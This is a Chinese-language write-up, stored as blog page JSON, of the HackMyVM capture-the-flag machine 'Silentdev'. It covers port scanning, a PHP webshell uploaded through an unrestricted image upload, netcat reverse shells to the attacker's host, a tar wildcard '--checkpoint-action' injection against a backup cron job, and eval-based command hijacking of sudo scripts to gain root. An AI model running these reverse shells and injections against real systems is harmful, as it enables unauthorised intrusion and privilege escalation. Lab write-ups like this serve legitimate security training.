{"pageProps":{"postData":{"id":"HackMyVMSilentdev","contentHtml":"<h1>Silentdev.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Silentdev\">https://hackmyvm.eu/machines/machine.php?vm=Silentdev</a></p>\n</blockquote>\n<p><img src=\"/post-images/HackMyVMSilentdev/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-bash\">➜  Slientdev nmap -sT -min-rate 10000 -p- 192.168.56.117\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 15:42 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.117\nHost is up (0.00055s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:1C:EA:F4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 16.97 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">\n➜  Slientdev nmap -sT -A -p 22,80 192.168.56.117        \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 15:42 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.117\nHost is up (0.00054s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)\n| ssh-hostkey: \n|   256 4a:f7:09:40:45:<span class=\"hljs-built_in\">df</span>:25:cc:a4:f5:85:ac:63:c6:13:3e (ECDSA)\n|_  256 58:be:2c:d0:40:af:d5:9c:2a:13:38:82:61:f6:8c:87 (ED25519)\n80/tcp open  http    Apache httpd 2.4.62 ((Debian))\n|_http-server-header: Apache/2.4.62 (Debian)\n|_http-title: Upload Image\nMAC Address: 08:00:27:1C:EA:F4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.54 ms 192.168.56.117\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 22.16 seconds\n</code></pre>\n<h2>FileUpload</h2>\n<p>直接就是一个文件上传功能</p>\n<p><img src=\"/post-images/HackMyVMSilentdev/image1.png\" alt=\"image.png\"></p>\n<p>上传一个普通图片后，会给出路径</p>\n<p><img src=\"/post-images/HackMyVMSilentdev/image2.png\" alt=\"image.png\"></p>\n<p>尝试上传 PHP 后缀文件，没想到直接上传成功了</p>\n<p><img src=\"/post-images/HackMyVMSilentdev/image3.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/HackMyVMSilentdev/image4.png\" alt=\"image.png\"></p>\n<p>写一句话木马，通过蚁剑连接</p>\n<p><img src=\"/post-images/HackMyVMSilentdev/image5.png\" alt=\"image.png\"></p>\n<p>弹 <code>shell</code></p>\n<pre><code class=\"hljs language-bash\">nc 192.168.56.5 1234 -e /bin/bash\n</code></pre>\n<p><img src=\"/post-images/HackMyVMSilentdev/image6.png\" alt=\"image.png\"></p>\n<h2>权限提升</h2>\n<h3>信息收集</h3>\n<p>我们能发现 <code>www-data</code> 用户拥有 <code>developers</code> 组权限</p>\n<pre><code class=\"hljs language-bash\">www-data@silentdev:/var/www/html/uploads$ <span class=\"hljs-built_in\">id</span>\nuid=33(www-data) gid=33(www-data) <span class=\"hljs-built_in\">groups</span>=33(www-data),1004(developers)\n</code></pre>\n<p><img src=\"/post-images/HackMyVMSilentdev/image7.png\" alt=\"image.png\"></p>\n<p>查询属于该组的文件</p>\n<pre><code class=\"hljs language-bash\">www-data@silentdev:/home$ find / -group developers 2>/dev/null\n/opt/project\n/var/backups\n</code></pre>\n<p><code>/opt/project</code></p>\n<pre><code class=\"hljs language-bash\">www-data@silentdev:/opt/project$ <span class=\"hljs-built_in\">ls</span> -al\ntotal 12      \ndrwxrwx--- 2 developer developers 4096 Apr 19 19:30 .\ndrwxr-xr-x 3 root      root       4096 Apr 19 11:08 ..\n-rw-r--r-- 1 root      root       2030 Apr 19 19:29 index.html\n\nwww-data@silentdev:/opt/project$ <span class=\"hljs-built_in\">ls</span>\nindex.html\n\nwww-data@silentdev:/opt/project$ python3 -m http.server 8080\nServing HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...\n</code></pre>\n<p><img src=\"/post-images/HackMyVMSilentdev/image8.png\" alt=\"image.png\"></p>\n<p><code>/var/backups</code></p>\n<pre><code class=\"hljs language-bash\">www-data@silentdev:/var/backups$ <span class=\"hljs-built_in\">ls</span>\napt.extended_states.0  project.tgz\n</code></pre>\n<p>解压出来的是和 project 中一模一样的 <code>index</code> 文件</p>\n<p>不过能看出来系统上有一个定时任务（Cron Job），它会定期将 <code>/opt/project</code> 目录的内容打包压缩成 <code>project.tgz</code> 文件，并存放到 <code>/var/backups</code> 目录中</p>\n<p>上传 <code>pspy</code> 看一下，果然 <code>1002</code> 用户定时会压缩 <code>/opt/project</code></p>\n<p><img src=\"/post-images/HackMyVMSilentdev/image9.png\" alt=\"image.png\"></p>\n<h3>tar 利用</h3>\n<p><code>*</code> 万恶之源</p>\n<pre><code class=\"hljs language-bash\">/bin/sh -c <span class=\"hljs-built_in\">cd</span> /opt/project &#x26;&#x26; tar -zcf /var/backups/project.tgz *\n</code></pre>\n<p>hijack：<a href=\"https://gtfobins.github.io/gtfobins/tar/\">https://gtfobins.github.io/gtfobins/tar/</a></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">cd</span> /opt/project\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'nc 192.168.56.5 1235 -e /bin/sh'</span> > shell.sh\n<span class=\"hljs-built_in\">chmod</span> +x shell.sh\n<span class=\"hljs-built_in\">touch</span> -- <span class=\"hljs-string\">\"--checkpoint=1\"</span>\n<span class=\"hljs-built_in\">touch</span> -- <span class=\"hljs-string\">\"--checkpoint-action=exec=sh shell.sh\"</span>\n</code></pre>\n<p>等待弹 shell 即可，即可拿到 <code>developers</code> 用户</p>\n<p><img src=\"/post-images/HackMyVMSilentdev/image10.png\" alt=\"image.png\"></p>\n<h3>命令劫持</h3>\n<p>查看 sudo 权限</p>\n<pre><code class=\"hljs language-bash\">developer@silentdev:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> developer on silentdev:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    use_pty\n\nUser developer may run the following commands on silentdev:\n    (alfonso) NOPASSWD: /usr/bin/sysinfo.sh\n</code></pre>\n<pre><code class=\"hljs language-bash\">developer@silentdev:~$ <span class=\"hljs-built_in\">cat</span> /usr/bin/sysinfo.sh \n<span class=\"hljs-comment\">#!/bin/bash</span>\n\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Hello <span class=\"hljs-variable\">$USER</span>, checking system status.\"</span>\n\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Choose an option:\"</span>\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"1. Disk usage (df)\"</span>\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"2. Running processes (ps)\"</span>\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"3. Exit\"</span>\n\n<span class=\"hljs-built_in\">read</span> -p <span class=\"hljs-string\">\"Enter option (1-3): \"</span> opt\n\n<span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$opt</span>\"</span> <span class=\"hljs-keyword\">in</span>\n        1) action=<span class=\"hljs-string\">\"df\"</span> ;;\n        2) action=<span class=\"hljs-string\">\"ps\"</span> ;;\n        3) <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Goodbye!\"</span>; <span class=\"hljs-built_in\">exit</span> ;;\n        *) action=<span class=\"hljs-string\">\"echo Invalid option\"</span> ;;\n<span class=\"hljs-keyword\">esac</span>\n\n<span class=\"hljs-built_in\">read</span> -p <span class=\"hljs-string\">\"Any additional options?: \"</span> extra\n\n<span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$action</span> <span class=\"hljs-variable\">$extra</span>\"</span>\n</code></pre>\n<p>我 TM 直接劫持</p>\n<p><img src=\"/post-images/HackMyVMSilentdev/image11.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/HackMyVMSilentdev/image12.png\" alt=\"image.png\"></p>\n<p>读取 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">alfonso@silentdev:~$ <span class=\"hljs-built_in\">cat</span> user.txt \nflag{A89aHFj3830878y3hFJ3h2oH}\n</code></pre>\n<h3>xxxx</h3>\n<p>查看 sudo 权限</p>\n<pre><code class=\"hljs language-bash\">alfonso@silentdev:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> alfonso on silentdev:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    use_pty\n\nUser alfonso may run the following commands on silentdev:\n    (ALL) NOPASSWD: /usr/bin/silentgets\n</code></pre>\n<pre><code class=\"hljs language-bash\">alfonso@silentdev:~$ /usr/bin/silentgets \nEnter the username: root\nroot:x:0:0:root:/root:/bin/bash\n</code></pre>\n<p>拉出来检查一下</p>\n<p><img src=\"/post-images/HackMyVMSilentdev/image13.png\" alt=\"image.png\"></p>\n<p>只能说又是命令劫持</p>\n<p><img src=\"/post-images/HackMyVMSilentdev/image14.png\" alt=\"image.png\"></p>\n<p>读取 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">root@silentdev:/home/alfonso# <span class=\"hljs-built_in\">cat</span> /root/root.txt \nflag{p7609TNt6a0bGF8HW78BG7eh}\n</code></pre>\n<h2>总结</h2>\n<p>不如群友 low</p>","title":"HackMyVM - Silentdev","date":"2025-09-26","updated":"2025-09-26","tags":["HMV","Linux","hijack","FileUpload"],"categories":"靶机","comments":true,"description":"Silentdev.\n\n https://hackmyvm.eu/machines/machine.php?vm=Silentdev\n \n\n\n\nRecon\n\nPortScan\n\n\n\n\n\nFileUpload\n\n直接就是一个文件上传功能\n\n\n\n上传一个普通图片后，会给出路径\n\n\n\n尝试上传 PHP 后缀文件，没想到直接上传成功了\n\n\n\n\n\n写一句话木马，通过蚁剑连接\n\n\n\n弹 `shell`\n\n\n\n..."},"recentPosts":[{"id":"HackMyVMSilentdev","title":"HackMyVM - Silentdev","date":"2025-09-26","isEncrypted":false,"year":"2025","month":"09","day":"26"},{"id":"TheHackersLabsFolclore","title":"TheHackersLabs - Folclore","date":"2025-09-24","isEncrypted":false,"year":"2025","month":"09","day":"24"},{"id":"HackMyVMAria","title":"HackMyVM - Aria","date":"2025-09-23","isEncrypted":false,"year":"2025","month":"09","day":"23"},{"id":"HackTheBoxSeason9 - Expressway","title":"HackTheBox - Season9 - Expressway","date":"2025-09-21","isEncrypted":true,"year":"2025","month":"09","day":"21"},{"id":"HackTheBoxSeason8 - Fluffy","title":"HackTheBox - Machine - Fluffy","date":"2025-05-25","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Planning","title":"HackTheBox - Machine - Planning","date":"2025-05-11","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Eureka","title":"HackTheBox - Machine - Eureka","date":"2025-04-28","isEncrypted":false,"year":"2025","month":"09","day":"20"}]},"__N_SSG":true}